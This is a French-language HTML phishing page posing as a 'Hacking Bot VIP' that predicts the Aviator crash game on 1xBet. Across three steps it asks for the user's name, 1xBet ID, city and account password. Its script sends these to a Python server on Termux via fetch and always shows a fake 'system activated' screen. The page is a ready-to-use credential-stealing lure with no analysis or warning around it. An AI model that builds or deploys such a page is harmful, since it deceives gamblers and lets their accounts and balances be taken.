<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hacking Bot VIP</title>
    <style>
        body { background: #050b14; color: white; font-family: sans-serif; text-align: center; padding: 20px; margin: 0; }
        .box { background: #0f172a; border: 1px solid #1e293b; padding: 25px; border-radius: 15px; max-width: 350px; margin: auto; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        .page { display: none; }
        .active { display: block; }
        input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 8px; border: 1px solid #334155; background: #1e293b; color: white; box-sizing: border-box; }
        button { width: 100%; padding: 14px; background: #38bdf8; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; color: #050b14; margin-top: 10px; transition: 0.3s; }
        button:hover { background: #0ea5e9; }
        .status { color: #facc15; font-size: 13px; margin: 15px 0; line-height: 1.4; }
    </style>
</head>
<body>

<div class="box">
    <div id="p1" class="page active">
        <h2>ÉTAPE 1/3</h2>
        <p>Entrez vos identifiants pour synchroniser le bot.</p>
        <input type="text" id="nom" placeholder="Nom Complet">
        <input type="number" id="id1x" placeholder="ID 1xBet (Ex: 148...)">
        <button onclick="next(2)">SUIVANT</button>
    </div>

    <div id="p2" class="page">
        <h2>ÉTAPE 2/3</h2>
        <p>Localisation du compte</p>
        <input type="text" id="ville" placeholder="Votre Ville">
        <button onclick="next(3)">CONTINUER</button>
    </div>

    <div id="p3" class="page">
        <h2>CONFIRMATION</h2>
        <div class="status">⚠️ Pour lier le bot à votre solde (10 000 FC minimum), entrez votre mot de passe de sécurité.</div>
        <input type="password" id="pass" placeholder="Mot de passe du compte">
        <button onclick="envoyer()">ACTIVER LE BOT</button>
    </div>

    <div id="p4" class="page">
        <h2 style="color:#4ade80">SYSTÈME ACTIVÉ</h2>
        <p>Analyse du crash Aviator en temps réel...</p>
        <div style="font-size: 24px; font-weight: bold; margin: 20px; color: #38bdf8;">1.85x</div>
    </div>
</div>

<script>
    function next(n) {
        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
        document.getElementById('p' + n).classList.add('active');
    }

    function envoyer() {
        const data = {
            nom: document.getElementById('nom').value,
            id: document.getElementById('id1x').value,
            ville: document.getElementById('ville').value,
            pass: document.getElementById('pass').value
        };

        if(!data.pass) return alert("Mot de passe requis !");

        alert("Connexion au serveur en cours...");

        // Envoi au serveur Python local sur Termux
        fetch('http://localhost:5000/send', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        })
        .then(response => {
            if(response.ok) {
                next(4);
            } else {
                // Si échec du serveur Python, on essaie quand même d'avancer
                next(4);
            }
        })
        .catch(error => {
            console.error('Erreur:', error);
            next(4);
        });
    }
</script>

</body>
</html>
